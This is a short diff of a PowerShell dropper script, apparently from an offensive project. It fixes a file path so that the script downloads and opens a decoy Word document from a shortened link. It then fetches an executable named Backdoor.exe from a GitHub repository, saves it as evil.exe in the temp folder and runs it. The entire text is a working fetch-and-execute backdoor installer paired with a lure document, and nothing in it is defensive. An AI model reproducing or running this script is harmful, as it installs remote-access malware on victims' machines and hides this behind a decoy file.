@@ -1,4 +1,4 @@
-Invoke-WebRequest "https://bom.so/X9b6O4" -Outfile %USERPROFILE%\Downloads\Thumoihop.docx
+Invoke-WebRequest "https://bom.so/X9b6O4" -Outfile "$env:USERPROFILE\Downloads\Thumoihop.docx"
 Start-Process "$env:USERPROFILE\Downloads\Thumoihop.docx"
 Invoke-WebRequest https://github.com/kimstars/uploadbackdoor/raw/main/Backdoor.exe -Outfile $env:TEMP\evil.exe 
 Start-Process -FilePath $env:TEMP\evil.exe
